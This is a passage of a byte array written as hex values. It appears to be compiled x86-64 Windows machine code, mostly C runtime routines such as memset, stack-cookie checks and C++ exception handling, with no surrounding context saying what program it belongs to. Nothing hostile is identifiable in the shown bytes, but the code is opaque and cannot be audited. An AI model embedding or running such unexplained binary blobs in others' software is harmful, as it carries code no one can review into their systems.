0x2a, 0x0, 0x0, 0x0, 0xeb, 0x20, 0xeb, 0x1e, 0xf6, 0x0, 0x10, 0x74, 0x19, 0x48, 0x8b, 0x41, 0x28, 0x48, 0x8b, 0x8, 0x48, 0x85, 0xc9, 0x74, 0xd, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0x40, 0x10, 0xff, 0x15, 0x74, 0xcb, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0xff, 0xe2, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x66, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x50, 0x58, 0xeb, 0x9, 0x48, 0x39, 0x1a, 0x74, 0x12, 0x48, 0x8b, 0x52, 0x8, 0x48, 0x85, 0xd2, 0x75, 0xf2, 0x8d, 0x42, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x33, 0xc0, 0xeb, 0xf6, 0xcc, 0x48, 0x63, 0x2, 0x48, 0x3, 0xc1, 0x83, 0x7a, 0x4, 0x0, 0x7c, 0x16, 0x4c, 0x63, 0x4a, 0x4, 0x48, 0x63, 0x52, 0x8, 0x49, 0x8b, 0xc, 0x9, 0x4c, 0x63, 0x4, 0xa, 0x4d, 0x3, 0xc1, 0x49, 0x3, 0xc0, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x39, 0x48, 0x8b, 0xd9, 0x81, 0x3f, 0x52, 0x43, 0x43, 0xe0, 0x74, 0x12, 0x81, 0x3f, 0x4d, 0x4f, 0x43, 0xe0, 0x74, 0xa, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x74, 0x22, 0xeb, 0x13, 0xe8, 0xf1, 0x2, 0x0, 0x0, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0xe6, 0x2, 0x0, 0x0, 0xff, 0x48, 0x30, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0xd1, 0x2, 0x0, 0x0, 0x48, 0x89, 0x78, 0x20, 0x48, 0x8b, 0x5b, 0x8, 0xe8, 0xc4, 0x2, 0x0, 0x0, 0x48, 0x89, 0x58, 0x28, 0xe8, 0xeb, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xdf, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0x8b, 0xc2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc8, 0xf3, 0xaa, 0x49, 0x8b, 0xc3, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xd9, 0xf, 0xb6, 0xd2, 0x49, 0xb9, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4c, 0xf, 0xaf, 0xca, 0x49, 0x83, 0xf8, 0x10, 0xf, 0x86, 0xf2, 0x0, 0x0, 0x0, 0x66, 0x49, 0xf, 0x6e, 0xc1, 0x66, 0xf, 0x60, 0xc0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x77, 0x10, 0xe9, 0x6b, 0x0, 0x0, 0x0, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x5, 0x81, 0x73, 0x1, 0x0, 0x2, 0x75, 0x97, 0xf, 0x11, 0x1, 0x4c, 0x3, 0xc1, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x83, 0xe1, 0xf0, 0x4c, 0x2b, 0xc1, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x7, 0x74, 0x3d, 0x4c, 0x3b, 0xd, 0x9e, 0x68, 0x1, 0x0, 0xf, 0x87, 0x60, 0x0, 0x0, 0x0, 0xf, 0x29, 0x1, 0xf, 0x29, 0x41, 0x10, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0xa0, 0xf, 0x29, 0x41, 0xb0, 0x49, 0xff, 0xc9, 0xf, 0x29, 0x41, 0xc0, 0xf, 0x29, 0x41, 0xd0, 0xf, 0x29, 0x41, 0xe0, 0x66, 0xf, 0x29, 0x41, 0xf0, 0x75, 0xd4, 0x49, 0x83, 0xe0, 0x7f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x4, 0x74, 0x13, 0xf, 0x1f, 0x80, 0x0, 0x0, 0x0, 0x0, 0xf, 0x11, 0x1, 0x48, 0x83, 0xc1, 0x10, 0x49, 0xff, 0xc9, 0x75, 0xf4, 0x49, 0x83, 0xe0, 0xf, 0x74, 0x6, 0x42, 0xf, 0x11, 0x44, 0x1, 0xf0, 0x49, 0x8b, 0xc3, 0xc3, 0xf, 0x1f, 0x40, 0x0, 0xf, 0x2b, 0x1, 0xf, 0x2b, 0x41, 0x10, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0xf, 0x2b, 0x41, 0xa0, 0xf, 0x2b, 0x41, 0xb0, 0x49, 0xff, 0xc9, 0xf, 0x2b, 0x41, 0xc0, 0xf, 0x2b, 0x41, 0xd0, 0xf, 0x2b, 0x41, 0xe0, 0xf, 0x2b, 0x41, 0xf0, 0x75, 0xd5, 0xf, 0xae, 0xf8, 0x49, 0x83, 0xe0, 0x7f, 0xeb, 0x9c, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xd1, 0x4c, 0x8d, 0xd, 0x96, 0xd6, 0xff, 0xff, 0x43, 0x8b, 0x84, 0x81, 0xb0, 0xc0, 0x1, 0x0, 0x4c, 0x3, 0xc8, 0x49, 0x3, 0xc8, 0x49, 0x8b, 0xc3, 0x41, 0xff, 0xe1, 0x66, 0x90, 0x48, 0x89, 0x51, 0xf1, 0x89, 0x51, 0xf9, 0x66, 0x89, 0x51, 0xfd, 0x88, 0x51, 0xff, 0xc3, 0x90, 0x48, 0x89, 0x51, 0xf4, 0x89, 0x51, 0xfc, 0xc3, 0x48, 0x89, 0x51, 0xf7, 0x88, 0x51, 0xff, 0xc3, 0x48, 0x89, 0x51, 0xf3, 0x89, 0x51, 0xfb, 0x88, 0x51, 0xff, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x89, 0x51, 0xf2, 0x89, 0x51, 0xfa, 0x66, 0x89, 0x51, 0xfe, 0xc3, 0x48, 0x89, 0x10, 0xc3, 0x48, 0x89, 0x10, 0x66, 0x89, 0x50, 0x8, 0x88, 0x50, 0xa, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x89, 0x10, 0x66, 0x89, 0x50, 0x8, 0xc3, 0x48, 0x89, 0x10, 0x48, 0x89, 0x50, 0x8, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x89, 0x54, 0x24, 0x18, 0x44, 0x89, 0x44, 0x24, 0x10, 0x49, 0xc7, 0xc1, 0x20, 0x5, 0x93, 0x19, 0xeb, 0x8, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x90, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0x5, 0x85, 0xc8, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x66, 0xf1, 0xff, 0xff, 0x48, 0x3b, 0xc2, 0x74, 0x23, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x30, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x89, 0x98, 0x0, 0x0, 0x0, 0x48, 0x3b, 0x48, 0x10, 0x72, 0x6, 0x48, 0x3b, 0x48, 0x8, 0x76, 0x7, 0xb9, 0xd, 0x0, 0x0, 0x0, 0xcd, 0x29, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x74, 0x11, 0x48, 0x8d, 0x5, 0x24, 0x72, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0xb2, 0x31, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x8b, 0xd, 0xd5, 0x66, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x33, 0x48, 0x85, 0xdb, 0x75, 0xe, 0xe8, 0x7e, 0x9, 0x0, 0x0, 0x8b, 0xd, 0xc0, 0x66, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x33, 0xd2, 0xe8, 0xb6, 0x9, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x74, 0x14, 0x48, 0x8d, 0x5, 0xda, 0x71, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x65, 0x31, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x13, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x5, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xe8, 0xc0, 0x31, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x83, 0x3d, 0x62, 0x66, 0x1, 0x0, 0xff, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0x90, 0x0, 0x0, 0x0, 0xff, 0x15, 0xe3, 0xc5, 0x0, 0x0, 0x8b, 0xd, 0x4d, 0x66, 0x1, 0x0, 0x8b, 0xf8, 0xe8, 0xfe, 0x8, 0x0, 0x0, 0x48, 0x83, 0xca, 0xff, 0x33, 0xf6, 0x48, 0x3b, 0xc2, 0x74, 0x67, 0x48, 0x85, 0xc0, 0x74, 0x5, 0x48, 0x8b, 0xf0, 0xeb, 0x5d, 0x8b, 0xd, 0x2b, 0x66, 0x1, 0x0, 0xe8, 0x26, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4e, 0xba, 0x80, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0x81, 0xe8, 0x35, 0x33, 0x0, 0x0, 0x8b, 0xd, 0xf, 0x66, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x24, 0x48, 0x8b, 0xd0, 0xe8, 0xff, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x48, 0x8b, 0xc3, 0xc7, 0x43, 0x78, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xde, 0x48, 0x8b, 0xf0, 0xeb, 0xd, 0x8b, 0xd, 0xe3, 0x65, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0xdc, 0x8, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x9c, 0x30, 0x0, 0x0, 0x8b, 0xcf, 0xff, 0x15, 0x64, 0xc5, 0x0, 0x0, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0xa9, 0xfe, 0xff, 0xff, 0xe8, 0xd0, 0x7, 0x0, 0x0, 0x89, 0x5, 0xa2, 0x65, 0x1, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x25, 0x48, 0x8d, 0x15, 0xc6, 0x70, 0x1, 0x0, 0x8b, 0xc8, 0xe8, 0x8f, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xe, 0xc7, 0x5, 0x29, 0x71, 0x1, 0x0, 0xfe, 0xff, 0xff, 0xff, 0xb0, 0x1, 0xeb, 0x7, 0xe8, 0x8, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x8b, 0xd, 0x66, 0x65, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0xc, 0xe8, 0xcc, 0x7, 0x0, 0x0, 0x83, 0xd, 0x55, 0x65, 0x1, 0x0, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0xd, 0xee, 0x70, 0x1, 0x0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x88, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xa, 0xff, 0x5, 0x2, 0x71, 0x1, 0x0, 0xb0, 0x1, 0xeb, 0x7, 0xe8, 0x9, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x1d, 0xe4, 0x70, 0x1, 0x0, 0xeb, 0x1d, 0x48, 0x8d, 0x5, 0xb3, 0x70, 0x1, 0x0, 0xff, 0xcb, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xc8, 0xff, 0x15, 0xa3, 0xc4, 0x0, 0x0, 0xff, 0xd, 0xc5, 0x70, 0x1, 0x0, 0x85, 0xdb, 0x75, 0xdf, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x4c, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x8, 0x53, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xd9, 0x83, 0x60, 0xc8, 0x0, 0x48, 0x89, 0x48, 0xe0, 0x4c, 0x89, 0x40, 0xe8, 0xe8, 0x20, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x8b, 0xb, 0x48, 0x8b, 0x40, 0x10, 0xff, 0x15, 0x3, 0xc6, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x40, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x0, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x59, 0xc, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0x85, 0xdb, 0x74, 0x26, 0xff, 0xcb, 0xe8, 0xd6, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x8d, 0x14, 0x88, 0x48, 0x63, 0x46, 0x10, 0x48, 0x3, 0xc2, 0x3b, 0x78, 0x4, 0x7e, 0xdd, 0x3b, 0x78, 0x8, 0x7f, 0xd8, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xcb, 0xe8, 0x78, 0x8, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x48, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xfa, 0xe8, 0x45, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0xf0, 0xe8, 0x33, 0x8, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x49, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x6, 0x41, 0x83, 0xc9, 0xff, 0xeb, 0x4, 0x44, 0x8b, 0x48, 0x4, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xe8, 0xc4, 0x19, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0x78, 0xc, 0x4c, 0x8b, 0xe1, 0x49, 0x8b, 0xc8, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xfa, 0xe8, 0xce, 0x7, 0x0, 0x0, 0x4d, 0x8b, 0x14, 0x24, 0x8b, 0xe8, 0x4c, 0x89, 0x16, 0x85, 0xff, 0x74, 0x74, 0x49, 0x63, 0x46, 0x10, 0xff, 0xcf, 0x48, 0x8d, 0x14, 0xbf, 0x48, 0x8d, 0x1c, 0x90, 0x49, 0x3, 0x5f, 0x8, 0x3b, 0x6b, 0x4, 0x7e, 0xe5, 0x3b, 0x6b, 0x8, 0x7f, 0xe0, 0x49, 0x8b, 0xf, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x78, 0xc2, 0x0, 0x0, 0x4c, 0x63, 0x43, 0x10, 0x33, 0xc9, 0x4c, 0x3, 0x44, 0x24, 0x50, 0x44, 0x8b, 0x4b, 0xc, 0x44, 0x8b, 0x10, 0x45, 0x85, 0xc9, 0x74, 0x17, 0x49, 0x8d, 0x50, 0xc, 0x48, 0x63, 0x2, 0x49, 0x3b, 0xc2, 0x74, 0x10, 0xff, 0xc1, 0x48, 0x83, 0xc2, 0x14, 0x41, 0x3b, 0xc9, 0x72, 0xed, 0x41, 0x3b, 0xc9, 0x73, 0x9c, 0x49, 0x8b, 0x4, 0x24, 0x48, 0x8d, 0xc, 0x89, 0x49, 0x63, 0x4c, 0x88, 0x10, 0x48, 0x8b, 0xc, 0x1, 0x48, 0x89, 0xe, 0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xe2, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xd1, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xf9, 0x45, 0x8b, 0xf8, 0x44, 0x8b, 0x73, 0xc, 0xe8, 0xf1, 0x6, 0x0, 0x0, 0x45, 0x33, 0xd2, 0x8b, 0xf0, 0x45, 0x85, 0xf6, 0xf, 0x84, 0xec, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x47, 0x8, 0x83, 0xc8, 0xff, 0x4c, 0x63, 0x5b, 0x10, 0x44, 0x8b, 0xc8, 0x44, 0x8b, 0xe8, 0x41, 0x8b, 0xd6, 0x8d, 0x5a, 0xff, 0x48, 0x8d, 0xc, 0x9b, 0x49, 0x8d, 0x4, 0x88, 0x42, 0x3b, 0x74, 0x18, 0x4, 0x7e, 0x7, 0x42, 0x3b, 0x74, 0x18, 0x8, 0x7e, 0xc, 0x8b, 0xd3, 0x8b, 0xc3, 0x85, 0xdb, 0x75, 0xdf, 0x85, 0xc0, 0x74, 0x10, 0x8d, 0x42, 0xff, 0x48, 0x8d, 0x4, 0x80, 0x49, 0x8d, 0x14, 0x83, 0x49, 0x3, 0xd0, 0xeb, 0x3, 0x49, 0x8b, 0xd2, 0x4b, 0x8d, 0xc, 0x18, 0x45, 0x8b, 0xc2, 0x41, 0x83, 0xcb, 0xff, 0x48, 0x85, 0xd2, 0x74, 0xf, 0x8b, 0x42, 0x4, 0x39, 0x1, 0x7e, 0x23, 0x8b, 0x42, 0x8, 0x39, 0x41, 0x4, 0x7f, 0x1b, 0x44, 0x3b, 0x39, 0x7c, 0x16, 0x44, 0x3b, 0x79, 0x4, 0x7f, 0x10, 0x45, 0x3b, 0xcb, 0x41, 0x8b, 0xc0, 0x45, 0x8b, 0xe8, 0x41, 0xf, 0x45, 0xc1, 0x44, 0x8b, 0xc8, 0x41, 0xff, 0xc0, 0x48, 0x83, 0xc1, 0x14, 0x45, 0x3b, 0xc6, 0x72, 0xc5, 0x45, 0x3b, 0xcb, 0x4c, 0x89, 0x64, 0x24, 0x20, 0x41, 0x8b, 0xc2, 0x4c, 0x89, 0x64, 0x24, 0x30, 0x41, 0xf, 0x45, 0xc1, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x40, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8d, 0x45, 0x1, 0xf, 0x10, 0x44, 0x24, 0x20, 0x44, 0xf, 0x45, 0xd0, 0x48, 0x8b, 0xc5, 0x44, 0x89, 0x54, 0x24, 0x38, 0xf, 0x10, 0x4c, 0x24, 0x30, 0xf3, 0xf, 0x7f, 0x45, 0x0, 0xf3, 0xf, 0x7f, 0x4d, 0x10, 0x49, 0x8b, 0x6b, 0x38, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xe8, 0xe2, 0x2c, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x8d, 0x6c, 0x24, 0xe1, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x67, 0x61, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0xf, 0x4c, 0x8b, 0x55, 0x77, 0x48, 0x8d, 0x5, 0x55, 0xd1, 0x0, 0x0, 0xf, 0x10, 0x0, 0x4c, 0x8b, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x88, 0x80, 0x0, 0x0, 0x0, 0xf, 0x11, 0x41, 0x60, 0xf, 0x10, 0x40, 0x70, 0x48, 0x8b, 0x80, 0x90, 0x0, 0x0, 0x0, 0xf, 0x11, 0x41, 0x70, 0xf, 0x11, 0x89, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x81, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5, 0xa4, 0x14, 0x0, 0x0, 0x49, 0x8b, 0xb, 0x48, 0x89, 0x45, 0x8f, 0x48, 0x8b, 0x45, 0x4f, 0x48, 0x89, 0x45, 0x9f, 0x48, 0x63, 0x45, 0x5f, 0x48, 0x89, 0x45, 0xa7, 0x48, 0x8b, 0x45, 0x57, 0x48, 0x89, 0x45, 0xb7, 0xf, 0xb6, 0x45, 0x7f, 0x48, 0x89, 0x45, 0xc7, 0x49, 0x8b, 0x42, 0x40, 0x48, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0x42, 0x28, 0x4c, 0x89, 0x4d, 0x97, 0x45, 0x33, 0xc9, 0x4c, 0x89, 0x45, 0xaf, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x89, 0x55, 0xbf, 0x49, 0x8b, 0x12, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xc7, 0x45, 0xcf, 0x20, 0x5, 0x93, 0x19, 0xff, 0x15, 0x2e, 0xc0, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xf, 0x48, 0x33, 0xcc, 0xe8, 0xf2, 0xae, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x11, 0xe8, 0xf3, 0xf9, 0xff, 0xff, 0x48, 0x3b, 0x58, 0x58, 0x73, 0xb, 0xe8, 0xe8, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x48, 0x58, 0xeb, 0x2, 0x33, 0xc9, 0x48, 0x89, 0x4b, 0x8, 0xe8, 0xd7, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x58, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0xe8, 0xb6, 0xf9, 0xff, 0xff, 0x48, 0x3b, 0x78, 0x58, 0x75, 0x35, 0xe8, 0xab, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x50, 0x58, 0x48, 0x85, 0xd2, 0x74, 0x27, 0x48, 0x8b, 0x5a, 0x8, 0x48, 0x3b, 0xfa, 0x74, 0xa, 0x48, 0x8b, 0xd3, 0x48, 0x85, 0xdb, 0x74, 0x16, 0xeb, 0xed, 0xe8, 0x8a, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x58, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x4e, 0x2b, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x57, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x68, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x3e, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x26, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0x59, 0x8, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x48, 0x89, 0x50, 0x8, 0x48, 0x8b, 0xe9, 0xe8, 0xf2, 0xf8, 0xff, 0xff, 0x48, 0x89, 0x58, 0x60, 0x48, 0x8b, 0x5d, 0x38, 0xe8, 0xe5, 0xf8, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0xe8, 0xdc, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x57, 0x38, 0x4c, 0x8b, 0xcf, 0x4c, 0x8b, 0xc6, 0x8b, 0xa, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x3, 0x48, 0x60, 0x33, 0xc0, 0x88, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x48, 0x8b, 0xcd, 0xe8, 0xb7, 0xf, 0x0, 